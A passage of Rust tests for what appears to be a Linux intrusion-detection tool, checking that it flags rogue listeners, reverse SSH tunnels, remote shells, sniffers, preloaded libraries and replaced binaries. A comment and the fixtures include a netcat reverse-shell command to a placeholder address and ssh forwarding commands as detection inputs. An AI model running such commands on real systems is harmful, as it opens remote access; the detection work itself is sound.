            ("usr/bin/sshd", "sshd"),
            ("usr/bin/socat", "socat"),
            ("usr/bin/nginx", "nginx"),
            ("usr/bin/mpd", "mpd"),
            ("usr/bin/python3", "python"),
            (
                "usr/lib/systemd/system/sshd.service",
                "[Service]\nExecStart=/usr/bin/sshd -D\n",
            ),
            (
                "usr/lib/systemd/user/mpd.service",
                "[Service]\nExecStart=/usr/bin/mpd --systemd\n",
            ),
        ],
    );
    let root = dir.path();
    write(root, "home/u/tool", "tool");
    listening_processes(root);
    let any = "00000000";
    let none = "00000000:0000";
    table(
        root,
        "tcp",
        &[
            (&format!("{any}:0016"), none, "0A", "700"),
            (&format!("{any}:08AE"), none, "0A", "701"),
            (&format!("{any}:115C"), none, "0A", "702"),
            (&format!("{any}:1F90"), none, "0A", "703"),
            (&format!("{any}:19C8"), none, "0A", "704"),
            (&format!("{any}:1F91"), none, "0A", "705"),
            (&format!("{any}:1F40"), none, "0A", "706"),
            // A port the kernel picked.
            (&format!("{any}:9C40"), none, "0A", "707"),
            (&format!("{any}:1F41"), none, "0A", "708"),
            // Root's, or another user's: nobody here holds it.
            (&format!("{any}:7A69"), none, "0A", "999"),
        ],
    );
    table(
        root,
        "udp",
        &[
            (&format!("{any}:270F"), none, "07", "709"),
            // mDNS, and a socket that only sent something.
            (&format!("{any}:14E9"), none, "07", "710"),
            (&format!("{any}:9C41"), none, "07", "711"),
            // A packaged server answering on UDP.
            (&format!("{any}:0035"), none, "07", "703"),
        ],
    );
    (dir, index)
}

#[test]
fn listeners_are_named_by_what_they_are() {
    let (dir, index) = listening_system();
    let live = look(dir.path(), &index, Origin::System);
    assert_eq!(
        listed(&live),
        [
            ("home/u/tool:udp-9999", vec![]),
            ("usr/bin/nginx:tcp-8080", vec![RuleId::NetworkListener]),
            ("usr/bin/nginx:tcp-8081", vec![RuleId::NetworkListener]),
            (
                "usr/bin/python3:listens:http.server",
                vec![RuleId::NetworkListener]
            ),
            (
                "usr/bin/python3:tcp-8000:http.server",
                vec![RuleId::NetworkListener]
            ),
            (
                "usr/bin/python3:tcp-8001:other",
                vec![RuleId::NetworkListener]
            ),
            ("usr/bin/socat:tcp-4444", vec![RuleId::NetworkRelay]),
            ("usr/bin/sshd:tcp-2222", vec![RuleId::NetworkRelay]),
        ]
    );
    // What a packaged service runs is listed with the trusted items.
    for (path, port) in [("usr/bin/sshd", "22"), ("usr/bin/mpd", "6600")] {
        let item = live.items.iter().find(|item| item.path == path).unwrap();
        assert!(item.is_trusted() && item.category == Category::Listener);
        assert!(
            item.notes[0].ends_with(&format!("listens on TCP port {port} from the network")),
            "{:?}",
            item.notes
        );
    }
    assert!(
        live.notes.iter().any(
            |note| note.starts_with("1 listening socket(s) belong to processes of other users")
        ),
        "{:?}",
        live.notes
    );
}

#[test]
fn only_the_service_a_process_is_in_vouches_for_it() {
    use super::net::{Starter, started_by_packaged_unit, starter};
    let user = "/user.slice/user-1000.slice/user@1000.service";
    for (cgroup, expected) in [
        (
            "/system.slice/sshd.service".to_string(),
            Some(Starter::System("sshd.service")),
        ),
        (
            "/system.slice/system-getty.slice/getty@tty1.service".into(),
            Some(Starter::System("getty@tty1.service")),
        ),
        // Below a system service the groups are that service's.
        (
            "/system.slice/docker.service/workers".into(),
            Some(Starter::System("docker.service")),
        ),
        (
            format!("{user}/app.slice/mpd.service"),
            Some(Starter::User("mpd.service")),
        ),
        (
            format!("{user}/session.slice/wayland-wm@hyprland.desktop.service"),
            Some(Starter::User("wayland-wm@hyprland.desktop.service")),
        ),
        // An app or terminal the desktop started, and whatever its
        // user makes below one.
        (
            format!(
                "{user}/app.slice/app-graphical.slice/app-Hyprland-xdg\\x2dterminal\\x2dexec-3dbb5f0d.scope"
            ),
            None,
        ),
        (format!("{user}/app.slice/run-u55.scope/mpd.service"), None),
        (format!("{user}/app.slice/odd/mpd.service"), None),
        // The managers' own groups and a login session.
        (format!("{user}/init.scope"), None),
        (user.to_string(), None),
        ("/user.slice/user-1000.slice/session-2.scope".into(), None),
        ("/init.scope".into(), None),
        (String::new(), None),
    ] {
        assert_eq!(starter(&cgroup), expected, "{cgroup}");
    }

    let (dir, index) = system(
        "live-starter",
        &[
            ("usr/bin/mpd", "mpd"),
            ("usr/bin/nginx", "nginx"),
            ("usr/bin/crond", "crond"),
            (
                "usr/lib/systemd/system/user@.service",
                "[Service]\nExecStart=/usr/lib/systemd/systemd --user\n",
            ),
            (
                "usr/lib/systemd/system/nginx.service",
                "[Service]\nExecStart=/usr/bin/nginx\n",
            ),
            (
                "usr/lib/systemd/system/cronie.service",
                "[Service]\nExecStart=/usr/bin/crond -n\n",
            ),
            (
                "usr/lib/systemd/user/mpd.service",
                "[Service]\nExecStart=/usr/bin/mpd --systemd\n",
            ),
        ],
    );
    let scope = Scope {
        root: dir.path(),
        home: None,
        index: &index,
        origin: Origin::System,
    };
    let vouched = |exe: &str, cgroup: &str| {
        started_by_packaged_unit(
            &scope,
            &super::Process {
                exe: exe.to_string(),
                cgroup: cgroup.to_string(),
                ..Default::default()
            },
        )
    };
    let app = format!("{user}/app.slice/app-Hyprland-kitty-77.scope");
    // The user manager's packaged template vouches for nothing that
    // runs in a session, and a group named like a unit below a scope
    // is the user's own making.
    assert!(!vouched("/usr/bin/nginx", &app));
    assert!(!vouched("/usr/bin/mpd", &format!("{app}/mpd.service")));
    assert!(!vouched("/usr/bin/nginx", &format!("{user}/init.scope")));
    assert!(vouched("/usr/bin/nginx", "/system.slice/nginx.service"));
    assert!(vouched(
        "/usr/bin/mpd",
        "/system.slice/nginx.service/workers"
    ));
    // A user's unit must name the program, in its own group or below.
    let mpd = format!("{user}/app.slice/mpd.service");
    assert!(vouched("/usr/bin/mpd", &mpd));
    assert!(vouched("/usr/bin/mpd", &format!("{mpd}/sub")));
    assert!(!vouched("/usr/bin/nginx", &mpd));
    // What cron runs for a user is in cron's group, and is not cron.
    assert!(vouched("/usr/bin/crond", "/system.slice/cronie.service"));
    assert!(!vouched("/usr/bin/nginx", "/system.slice/cronie.service"));
}

#[test]
fn a_listening_module_is_named_by_the_file_python_runs_for_it() {
    let server = "usr/lib/python3.14/http/server.py";
    let (dir, index) = system(
        "live-module",
        &[("usr/bin/python3.14", "python"), (server, "stdlib")],
    );
    let root = dir.path();
    symlink("python3.14", root.join("usr/bin/python3")).unwrap();
    fs::create_dir_all(root.join("home/u/work")).unwrap();
    // A module of the same name where the process was started.
    write(root, "tmp/x/http/server.py", "not the stdlib's");
    let any = "00000000";
    let none = "00000000:0000";
    let mut sockets = Vec::new();
    for (pid, cwd, arguments, inode, port) in [
        (
            "30",
            "/home/u/work",
            "python3 -m http.server 8000",
            "800",
            "1F40",
        ),
        ("31", "/tmp/x", "python3 -m http.server 8000", "801", "1F41"),
        (
            "32",
            "/home/u/work",
            "python3 -um other 8002",
            "802",
            "1F42",
        ),
        ("33", "/home/u", "python3 -m other 8003", "803", "1F43"),
    ] {
        let socket = format!("socket:[{inode}]");
        process(
            root,
            pid,
            "/usr/bin/python3.14",
            &[("0", "/dev/null"), ("3", &socket)],
            "",
        );
        detail(root, pid, "cmdline", &arguments.replace(' ', "\0"));
        symlink(cwd, root.join("proc").join(pid).join("cwd")).unwrap();
        sockets.push((format!("{any}:{port}"), inode));
    }
    let rows: Vec<(&str, &str, &str, &str)> = sockets
        .iter()
        .map(|(local, inode)| (local.as_str(), none, "0A", *inode))
        .collect();
    table(root, "tcp", &rows);
    let live = look(root, &index, Origin::System);
    let found = listed(&live);
    let listener = RuleId::NetworkListener;
    // The interpreter's own module is the item, by its file: what is
    // allowed is that file's content on that port.
    assert!(
        found.contains(&("usr/lib/python3.14/http/server.py:tcp-8000", vec![listener])),
        "{found:?}"
    );
    let own = live
        .items
        .iter()
        .find(|item| item.path.starts_with(server))
        .unwrap();
    assert_eq!(own.sha256, Some(Sha256::digest(b"stdlib")));
    // The same command line where a module of that name lies beside
    // it is another item, and says what it takes the place of.
    assert!(
        found.contains(&("tmp/x/http/server.py:tcp-8001", vec![listener])),
        "{found:?}"
    );
    assert!(
        found.contains(&(
            "tmp/x/http/server.py",
            vec![RuleId::PathHijack, RuleId::RunningFromTemp]
        )),
        "{found:?}"
    );
    // A module that cannot be found is named with where the process
    // was started: the same name elsewhere is another item.
    let unresolved: Vec<&str> = found
        .iter()
        .map(|(path, _)| *path)
        .filter(|path| path.contains(":other:cwd-"))
        .collect();
    assert_eq!(unresolved.len(), 2, "{found:?}");
    assert_ne!(unresolved[0], unresolved[1]);
    assert!(unresolved[0].starts_with("usr/bin/python3.14:tcp-8002:other:cwd-"));
}

#[test]
fn a_module_is_named_only_where_the_file_python_runs_is_certain() {
    let server = "usr/lib/python3.14/http/server.py";
    let (dir, index) = system(
        "live-module-certain",
        &[("usr/bin/python3.14", "python"), (server, "stdlib")],
    );
    let root = dir.path();
    symlink("python3.14", root.join("usr/bin/python3")).unwrap();
    fs::create_dir_all(root.join("home/u/work")).unwrap();
    let scope = Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::System,
    };
    let module = |cwd: &str, environment: &str| {
        let python = running(
            "/usr/bin/python3",
            &["python3", "-m", "http.server"],
            Some(cwd),
            environment,
        );
        super::module_of(&scope, &python, "usr/bin/python3")
            .unwrap()
            .file
    };
    assert_eq!(module("home/u/work", "").as_deref(), Some(server));
    assert_eq!(module("home/u/work", "PYTHONPATH=/tmp/x;"), None);
    write(root, "home/u/work/http/other.py", "part of the name");
    assert_eq!(module("home/u/work", ""), None);
    let script = running(
        "/usr/bin/python3",
        &["python3", "x.py", "-m", "y"],
        None,
        "",
    );
    assert_eq!(super::module_of(&scope, &script, "usr/bin/python3"), None);

    // Root, led by a process into a directory not everyone may enter,
    // names no file whether or not the module's name is in there: the
    // answer would tell the process's user what the directory holds.
    let as_root = Scope {
        origin: Origin::Root,
        ..scope
    };
    let rooted = |cwd: &str| {
        let python = running(
            "/usr/bin/python3",
            &["python3", "-m", "http.server"],
            Some(cwd),
            "",
        );
        super::module_of(&as_root, &python, "usr/bin/python3")
            .unwrap()
            .file
    };
    fs::create_dir_all(root.join("home/u/open")).unwrap();
    assert_eq!(rooted("home/u/open").as_deref(), Some(server));
    for closed in ["home/u/closed", "home/u/closed-with"] {
        fs::create_dir_all(root.join(closed)).unwrap();
    }
    write(root, "home/u/closed-with/http.py", "in the way");
    for closed in ["home/u/closed", "home/u/closed-with"] {
        fs::set_permissions(root.join(closed), fs::Permissions::from_mode(0o700)).unwrap();
        assert_eq!(rooted(closed), None, "{closed}");
    }
    // One everyone may enter is looked into, directories included.
    fs::create_dir_all(root.join("home/u/open/http")).unwrap();
    assert_eq!(rooted("home/u/open"), None);
}

#[test]
fn a_listening_socket_no_process_holds_is_a_finding_for_root() {
    let (dir, index) = listening_system();
    let root = dir.path();
    // Root sees every process: a socket none holds is the kernel's
    // own where a module that serves files is loaded, and else a
    // sign of a hidden process.
    let about = |live: &super::Live| -> Vec<RuleId> {
        live.items
            .iter()
            .filter(|item| item.path == "proc/net/tcp:31337")
            .flat_map(|item| item.alerts.iter().map(|(rule, _)| *rule))
            .collect()
    };
    assert_eq!(
        about(&look(root, &index, Origin::Root)),
        [RuleId::RootkitSign]
    );
    write(root, "proc/modules", "nfsd 1 0 - Live 0x0\n");
    let live = look(root, &index, Origin::Root);
    assert!(about(&live).is_empty());
    assert!(
        live.notes
            .iter()
            .any(|note| note.contains("the kernel's own")),
        "{:?}",
        live.notes
    );
}

#[test]
fn a_tunnel_and_a_server_with_its_own_settings_are_told_apart() {
    use super::net::{forwards, own_settings};
    let words = |line: &'static str| -> Vec<&'static str> { line.split(' ').collect() };
    for line in [
        "ssh -R 8080:localhost:80 host",
        "ssh -fNR 8080:localhost:80 host",
        "ssh -D 1080 host",
        "ssh -N -w0:0 host",
        "ssh -o RemoteForward=8080 host",
        "ssh -oDynamicForward=1080 host",
    ] {
        assert!(forwards(&words(line)), "{line}");
    }
    for line in [
        "ssh host",
        "ssh -i /home/u/.ssh/Raw_Deploy host",
        "ssh -oProxyCommand=Relay host",
        "ssh -vvv -p 22 -l Dana host",
        "ssh -L 8080:localhost:80 host",
    ] {
        assert!(!forwards(&words(line)), "{line}");
    }
    for line in [
        "sshd -f /tmp/cfg",
        "sshd -f/home/u/cfg",
        "/usr/bin/sshd -D -p 2222",
        "sshd -o PermitRootLogin=yes",
    ] {
        assert!(own_settings(&words(line)), "{line}");
    }
    for line in [
        "sshd: /usr/bin/sshd -D [listener] 0 of 10-100 startups",
        "sshd -D -f /etc/ssh/sshd_config",
    ] {
        assert!(!own_settings(&words(line)), "{line}");
    }
}

#[test]
fn a_tunnel_started_from_no_terminal_and_a_connected_relay_are_said() {
    let (dir, index) = system(
        "live-relays",
        &[("usr/bin/ssh", "ssh"), ("usr/bin/ncat", "ncat")],
    );
    let root = dir.path();
    let tunnel = "ssh -N -R 8080:localhost:80 host";
    process(
        root,
        "30",
        "/usr/bin/ssh",
        &[("0", "/dev/null"), ("3", "socket:[800]")],
        "",
    );
    detail(root, "30", "cmdline", &tunnel.replace(' ', "\0"));
    // The same, typed at a terminal.
    process(
        root,
        "31",
        "/usr/bin/ssh",
        &[("0", "/dev/pts/3"), ("3", "socket:[801]")],
        "",
    );
    detail(root, "31", "cmdline", &tunnel.replace(' ', "\0"));
    // `ncat -e /bin/bash 198.51.100.7 4444`, and one to this machine.
    process(root, "32", "/usr/bin/ncat", &[("3", "socket:[802]")], "");
    process(root, "33", "/usr/bin/ncat", &[("3", "socket:[803]")], "");
    let here = "0200A8C0:D431";
    table(
        root,
        "tcp",
        &[
            (here, "057100CB:0016", "01", "800"),
            (here, "057100CB:0016", "01", "801"),
            (here, "076433C6:115C", "01", "802"),
            ("0100007F:D431", "0100007F:115C", "01", "803"),
        ],
    );
    let live = look(root, &index, Origin::System);
    assert_eq!(
        listed(&live),
        [
            ("usr/bin/ncat:to-198.51.100.7", vec![RuleId::NetworkRelay]),
            ("usr/bin/ssh:to-203.0.113.5", vec![RuleId::NetworkRelay]),
        ]
    );
}

#[test]
fn every_check_knows_the_same_shells_and_interpreters() {
    let (dir, index) = system(
        "live-programs",
        &[
            ("usr/bin/mksh", "mksh"),
            ("usr/bin/elvish", "elvish"),
            ("usr/bin/nu", "nu"),
            ("usr/bin/ash", "ash"),
            ("usr/bin/busybox", "busybox"),
            ("usr/bin/nc.openbsd", "nc"),
        ],
    );
    let root = dir.path();
    for path in ["home/u/spy", "home/u/run.sh"] {
        write(root, path, path);
    }
    let status = |pid: &str, name: &str, tracer: u32| {
        detail(
            root,
            pid,
            "status",
            &format!("Name:\t{name}\nTgid:\t{pid}\nPid:\t{pid}\nPPid:\t1\nTracerPid:\t{tracer}\n"),
        );
    };
    // Something attached to a shell the tracing check did not know.
    process(root, "40", "/usr/bin/mksh", &[], "");
    status("40", "mksh", 41);
    process(root, "41", "/home/u/spy", &[], "");
    status("41", "spy", 0);
    // A shell at a terminal that holds a connection: one the
    // connection check did not know, and one with a client of its own,
    // which is reported once the connection is its input and output.
    let held = |pid: &str, exe: &str, inode: &str| {
        let socket = format!("socket:[{inode}]");
        process(root, pid, exe, &[("0", "/dev/pts/1"), ("3", &socket)], "");
    };
    held("42", "/usr/bin/elvish", "900");
    held("43", "/usr/bin/nu", "901");
    let socket = "socket:[902]";
    process(
        root,
        "44",
        "/usr/bin/nu",
        &[("0", socket), ("1", socket), ("2", socket)],
        "",
    );
    let here = "0200A8C0:D431";
    table(
        root,
        "tcp",
        &[
            (here, "076433C6:115C", "01", "900"),
            (here, "076433C6:115C", "01", "901"),
            (here, "057100CB:01BB", "01", "902"),
        ],
    );
    let live = look(root, &index, Origin::System);
    assert_eq!(
        listed(&live),
        [
            ("home/u/spy:attached-to-mksh", vec![RuleId::TracedSecrets]),
            ("usr/bin/elvish:to-198.51.100.7", vec![RuleId::RemoteShell]),
            ("usr/bin/nu:to-203.0.113.5", vec![RuleId::RemoteShell]),
        ]
    );

    // A shell the live checks did not count as an interpreter is named
    // by its script; so is a multi-call program run as a shell, which
    // is a relay too. A netcat is named by itself.
    let scope = Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    };
    for (exe, arguments, subject) in [
        ("usr/bin/ash", ["ash", "/home/u/run.sh"], "home/u/run.sh"),
        ("usr/bin/busybox", ["sh", "/home/u/run.sh"], "home/u/run.sh"),
        (
            "usr/bin/nc.openbsd",
            ["nc.openbsd", "/home/u/run.sh"],
            "usr/bin/nc.openbsd",
        ),
    ] {
        assert!(super::is_interpreter(exe), "{exe}");
        let process = running(&format!("/{exe}"), &arguments, None, "");
        assert_eq!(super::subject(&scope, &process, exe).0, subject, "{exe}");
    }
}

#[test]
fn raw_packet_sockets_and_promiscuous_interfaces_are_looked_at() {
    let (dir, index) = system(
        "live-packets",
        &[
            ("usr/bin/NetworkManager", "nm"),
            ("usr/bin/python3", "python"),
        ],
    );
    let root = dir.path();
    write(root, "home/u/sniff", "sniffer");
    process(
        root,
        "40",
        "/usr/bin/NetworkManager",
        &[("9", "socket:[900]")],
        "",
    );
    process(root, "41", "/home/u/sniff", &[("3", "socket:[901]")], "");
    write(
        root,
        "proc/net/packet",
        "sk               RefCnt Type Proto  Iface R Rmem   User   Inode\n0000000040c08707 3      2    890d   2     1 0      0      900\n00000000a81581b0 3      3    0003   0     1 0      1000   901\n0000000020f7362c 3      2    0806   2     1 0      0      902\n",
    );
    write(root, "sys/class/net/eth0/flags", "0x1103\n");
    write(root, "sys/class/net/lo/flags", "0x9\n");
    // A bridge's port is promiscuous by design.
    write(root, "sys/class/net/veth0/flags", "0x1103\n");
    write(root, "sys/class/net/veth0/brport/state", "3\n");
    let live = look(root, &index, Origin::System);
    assert_eq!(
        listed(&live),
        [("home/u/sniff:packet-socket", vec![RuleId::KernelTap])]
    );
    let promiscuous: Vec<&String> = live
        .notes
        .iter()
        .filter(|note| note.contains("promiscuous"))
        .collect();
    assert_eq!(promiscuous.len(), 1, "{promiscuous:?}");
    assert!(promiscuous[0].contains("eth0"));
    // Root sees every process: a socket none of them holds is said.
    let live = look(root, &index, Origin::Root);
    assert!(
        live.items
            .iter()
            .any(|item| item.path == "proc/net/packet" && item.alerts[0].0 == RuleId::KernelTap)
    );
    // The sniffer is no process of root's.
    assert!(live.of_accounts.contains("home/u/sniff:packet-socket"));
}

#[test]
fn a_deleted_program_is_checked_whatever_is_at_its_path_now() {
    let (dir, index) = system("live-decoy", &[("usr/bin/hyprland", "compositor")]);
    let root = dir.path();
    // It started, deleted itself and left a harmless file behind.
    write(root, "home/u/.cache/x", "decoy");
    process(
        root,
        "40",
        "/home/u/.cache/x (deleted)",
        &[("3", "/dev/input/event0"), ("4", "socket:[800]")],
        "LD_PRELOAD=/home/u/.hook.so;",
    );
    write(root, "home/u/.hook.so", "hook");
    table(
        root,
        "tcp",
        &[("00000000:15B3", "00000000:0000", "0A", "800")],
    );
    let live = look(root, &index, Origin::System);
    let item = live
        .items
        .iter()
        .find(|item| item.path == "home/u/.cache/x")
        .unwrap();
    let alerts: Vec<RuleId> = item.alerts.iter().map(|(rule, _)| *rule).collect();
    assert_eq!(
        alerts,
        [
            RuleId::HiddenProgram,
            RuleId::RunningFromTemp,
            RuleId::KeyboardReader,
            RuleId::NetworkListener
        ]
    );
    // The decoy's content does not pass for the program's.
    assert!(item.sha256.is_none());
    assert!(
        live.items
            .iter()
            .any(|item| item.path == "home/u/.hook.so"
                && item.alerts[0].0 == RuleId::PreloadedLibrary)
    );
}

#[test]
fn a_name_that_ends_like_a_deleted_one_is_told_from_a_deleted_file() {
    use std::process::{Command, Stdio};
    if !crate::test_support::tool_available("/usr/bin/sleep") {
        return;
    }
    let dir = TempDir::new("live-deleted");
    let run = |name: &str| {
        let program = dir.path().join(name);
        fs::copy("/usr/bin/sleep", &program).unwrap();
        // Another test's child, forked while the copy was being written,
        // holds it open for a moment: the kernel then calls it busy.
        let mut tries = 0;
        let child = loop {
            match Command::new(&program)
                .arg("60")
                .stdout(Stdio::null())
                .spawn()
            {
                Err(error)
                    if error.kind() == std::io::ErrorKind::ExecutableFileBusy && tries < 200 =>
                {
                    tries += 1;
                    std::thread::sleep(std::time::Duration::from_millis(10));
                }
                child => break child.unwrap(),
            }
        };
        (program, child)
    };
    let (gone, mut deleted) = run("gone");
    let (_, mut named) = run("named (deleted)");
    // Deleted under its name while a second name keeps the file.
    let (twice, mut linked) = run("twice");
    fs::hard_link(&twice, dir.path().join("kept")).unwrap();
    fs::remove_file(&gone).unwrap();
    fs::remove_file(&twice).unwrap();
    let running = super::processes(Path::new("/"));
    let seen = |pid: u32| {
        running
            .processes
            .iter()
            .find(|process| process.number() == pid)
            .map(|process| (process.deleted, process.name().to_string()))
    };
    let results = [seen(deleted.id()), seen(named.id()), seen(linked.id())];
    for child in [&mut deleted, &mut named, &mut linked] {
        child.kill().unwrap();
        child.wait().unwrap();
    }
    assert_eq!(
        results,
        [
            Some((true, "gone".to_string())),
            Some((false, "named (deleted)".to_string())),
            Some((true, "twice".to_string())),
        ]
    );
}

/// A system where a running program, a preloaded library and a loaded
/// module were replaced where their packages put them, next to ones
/// that were not; and modules the kernel marks.
fn replaced_system() -> (TempDir, PackageIndex) {
    let (dir, mut index) = system(
        "live-content",
        &[
            ("usr/bin/daemon", "daemon"),
            ("usr/bin/ok", "ok"),
            ("usr/lib/libgood.so", "library"),
            ("usr/lib/libfine.so", "fine"),
            ("usr/lib/modules/6.1-test/pkgbase", "linux\n"),
            ("usr/lib/modules/6.1-test/kernel/a.ko.zst", "module a"),
            ("usr/lib/modules/6.1-test/kernel/b.ko.zst", "module b"),
        ],
    );
    let root = dir.path();
    installed_by(
        &mut index,
        "nvidia-open",
        &[("usr/lib/modules/6.1-test/extramodules/nv.ko.zst", "nv")],
    );
    installed_by(
        &mut index,
        "odd",
        &[("usr/lib/modules/6.1-test/extramodules/odd.ko.zst", "odd")],
    );
    write(
        root,
        "usr/lib/modules/6.1-test/extramodules/nv.ko.zst",
        "nv",
    );
    write(
        root,
        "usr/lib/modules/6.1-test/extramodules/odd.ko.zst",
        "odd",
    );
    // Replaced where their packages put them.
    write(root, "usr/bin/daemon", "trojan");
    write(root, "usr/lib/libgood.so", "hooked");
    write(root, "usr/lib/modules/6.1-test/kernel/a.ko.zst", "rootkit");
    process(
        root,
        "50",
        "/usr/bin/daemon",
        &[("3", "/dev/input/event0")],
        "",
    );
    process(
        root,
        "51",
        "/usr/bin/ok",
        &[("3", "/dev/input/event0")],
        "LD_PRELOAD=/usr/lib/libgood.so:/usr/lib/libfine.so;",
    );
    write(root, "proc/sys/kernel/osrelease", "6.1-test\n");
    write(
        root,
        "usr/lib/modules/6.1-test/modules.dep",
        "kernel/a.ko.zst:\nkernel/b.ko.zst:\nextramodules/nv.ko.zst:\nextramodules/odd.ko.zst:\n",
    );
    write(
        root,
        "proc/modules",
        "a 1 0 - Live 0x0\nb 1 0 - Live 0x0\nnv 1 0 - Live 0x0\nodd 1 0 - Live 0x0\n",
    );
    // What the kernel says of each module it loaded.
    write(root, "sys/module/a/taint", "\n");
    write(root, "sys/module/b/taint", "E\n");
    write(root, "sys/module/nv/taint", "POE\n");
    write(root, "sys/module/odd/taint", "OE\n");
    write(root, "proc/sys/kernel/tainted", "12289\n");
    (dir, index)
}

#[test]
fn a_packaged_path_is_trusted_for_its_content_only() {
    let (dir, index) = replaced_system();
    let live = look(dir.path(), &index, Origin::System);
    let seen: Vec<(&str, &str, Vec<RuleId>)> = live
        .items
        .iter()
        .filter(|item| !item.is_trusted())
        .map(|item| {
            (
                item.path.as_str(),
                item.tier.name(),
                item.alerts.iter().map(|(rule, _)| *rule).collect(),
            )
        })
        .collect();
    let module = RuleId::UnknownKernelModule;
    assert_eq!(
        seen,
        [
            // Judged like a program no package installed.
            ("usr/bin/daemon", "modified", vec![RuleId::KeyboardReader]),
            (
                "usr/lib/libgood.so",
                "modified",
                vec![RuleId::PreloadedLibrary]
            ),
            (
                "usr/lib/modules/6.1-test/extramodules/odd.ko.zst",
                "package",
                vec![module]
            ),
            (
                "usr/lib/modules/6.1-test/kernel/a.ko.zst",
                "modified",
                vec![module]
            ),
            (
                "usr/lib/modules/6.1-test/kernel/b.ko.zst",
                "package",
                vec![module]
            ),
        ]
    );
}

#[test]
fn a_packaged_program_closed_to_readers_is_still_compared() {
    use std::os::unix::fs::MetadataExt;
    let (dir, mut index) = system(
        "live-closed",
        &[("usr/bin/shut", "shut"), ("usr/bin/same", "same")],
    );
    let root = dir.path();
    // Root reads everything: there is no closed file to play.
    if fs::metadata(root).unwrap().uid() == 0 {
        return;
    }
    // One its package installs for root alone, as `cupsd` is.
    index.add_for_test(
        "own",
        &format!(
            "#mtree\n./usr/bin/private type=file mode=700 sha256digest={}\n",
            Sha256::digest(b"private")
        ),
        &[],
    );
    write(root, "usr/bin/private", "private");
    write(root, "usr/bin/shut", "trojan");
    let close = |path: &str, mode: u32| {
        fs::set_permissions(root.join(path), fs::Permissions::from_mode(mode)).unwrap();
    };
    for (pid, name) in [("60", "shut"), ("61", "same"), ("62", "private")] {
        close(&format!("usr/bin/{name}"), 0o700);
        let exe = format!("/usr/bin/{name}");
        process(root, pid, &exe, &[("3", "/dev/input/event0")], "");
    }
    let live = look(root, &index, Origin::Root);
    let keys = vec![RuleId::KeyboardReader];
    // The changed one is not trusted for its path, and neither is one
    // somebody closed; what the package ships closed is compared too,
    // and is as installed.
    assert_eq!(
        listed(&live),
        [
            ("usr/bin/same", keys.clone()),
            ("usr/bin/shut", keys.clone())
        ]
    );
    for item in &live.items {
        assert_eq!(item.tier.name(), "modified", "{}", item.path);
        // Nothing of the content of a file not everyone may read.
        assert_eq!(item.sha256, None, "{}", item.path);
        assert_eq!(item.body, Body::Binary(crate::sweep::collect::COMPARED));
        assert!(
            item.notes
                .contains(&crate::sweep::collect::CLOSED.to_string()),
            "{:?}",
            item.notes
        );
    }
    // The path must be the package's own, reached with no link on the
    // way: anything else a process names stays unseen.
    let scope = Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    };
    symlink("usr/bin", root.join("bin")).unwrap();
    let item = crate::sweep::collect::packaged_item;
    assert!(item(&scope, Category::Process, "usr/bin/shut").is_some());
    assert!(item(&scope, Category::Process, "bin/shut").is_none());
    write(root, "usr/bin/unowned", "x");
    close("usr/bin/unowned", 0o700);
    assert!(item(&scope, Category::Process, "usr/bin/unowned").is_none());
    fs::remove_file(root.join("usr/bin/unowned")).unwrap();

    // The user's own sweep cannot read a closed file. One its package
    // ships readable is told as closed; one shipped closed is taken on
    // its path's word, as before.
    for name in ["shut", "same", "private"] {
        close(&format!("usr/bin/{name}"), 0o000);
    }
    let live = look(root, &index, Origin::System);
    assert_eq!(
        listed(&live),
        [("usr/bin/same", keys.clone()), ("usr/bin/shut", keys)]
    );
    assert!(live.items.iter().all(|item| {
        item.tier.name() == "modified"
            && item
                .notes
                .contains(&crate::sweep::collect::CLOSED.to_string())
    }));
    for name in ["shut", "same", "private"] {
        close(&format!("usr/bin/{name}"), 0o700);
    }
}

#[test]
fn a_packaged_path_in_a_closed_directory_tells_one_bit_or_nothing() {
    use std::os::unix::fs::MetadataExt;
    let (dir, mut index) = system("live-out-of-sight", &[("usr/bin/same", "same")]);
    let root = dir.path();
    if fs::metadata(root).unwrap().uid() == 0 {
        return;
    }
    // A package's libraries in a directory of root's alone: one that
    // is as installed, one changed, one missing, one that is a
    // directory now. And a missing one where everyone may look.
    let entry = |path: &str, text: &str| {
        format!(
            "./{path} type=file mode=600 sha256digest={}\n",
            Sha256::digest(text.as_bytes())
        )
    };
    let closed = ["same", "changed", "gone", "odd"].map(|name| format!("usr/lib/shut/{name}.so"));
    let mut mtree = String::from("#mtree\n");
    for path in &closed {
        mtree.push_str(&entry(path, "library"));
    }
    mtree.push_str(&entry("usr/lib/open.so", "library"));
    index.add_for_test("libs", &mtree, &[]);
    write(root, "usr/lib/shut/same.so", "library");
    write(root, "usr/lib/shut/changed.so", "trojan");
    fs::create_dir_all(root.join("usr/lib/shut/odd.so")).unwrap();
    for file in ["same", "changed"] {
        let path = root.join(format!("usr/lib/shut/{file}.so"));
        fs::set_permissions(path, fs::Permissions::from_mode(0o600)).unwrap();
    }
    fs::set_permissions(root.join("usr/lib/shut"), fs::Permissions::from_mode(0o700)).unwrap();
    let preload = format!(
        "LD_PRELOAD=/{}:/usr/lib/open.so:/usr/lib/shut/unowned.so",
        closed.join(":/")
    );
    process(root, "70", "/usr/bin/same", &[], &preload);
    let live = look(root, &index, Origin::Root);
    let named: Vec<(&str, &str)> = live
        .items
        .iter()
        .filter(|item| item.path.starts_with("usr/lib/"))
        .map(|item| (item.path.as_str(), item.tier.name()))
        .collect();
    // The changed one is told, the intact one is not, and neither are
    // the two that would say what the closed directory holds. A path
    // no package owns, and one in a directory anyone may list, are
    // told as before.
    assert_eq!(
        named.iter().map(|(path, _)| *path).collect::<Vec<_>>(),
        [
            "usr/lib/open.so",
            "usr/lib/shut/changed.so",
            "usr/lib/shut/unowned.so"
        ],
        "{named:?}"
    );
    assert_eq!(named[1].1, "modified");
    let scope = Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    };
    let unseen = crate::sweep::collect::packaged_out_of_sight;
    assert!(unseen(&scope, "usr/lib/shut/gone.so"));
    assert!(!unseen(&scope, "usr/lib/shut/unowned.so"));
    assert!(!unseen(&scope, "usr/lib/open.so"));
    // A directory somebody else may write is not root's alone.
    fs::set_permissions(root.join("usr/lib/shut"), fs::Permissions::from_mode(0o720)).unwrap();
    assert!(!unseen(&scope, "usr/lib/shut/gone.so"));
    fs::set_permissions(root.join("usr/lib/shut"), fs::Permissions::from_mode(0o700)).unwrap();
}

#[test]
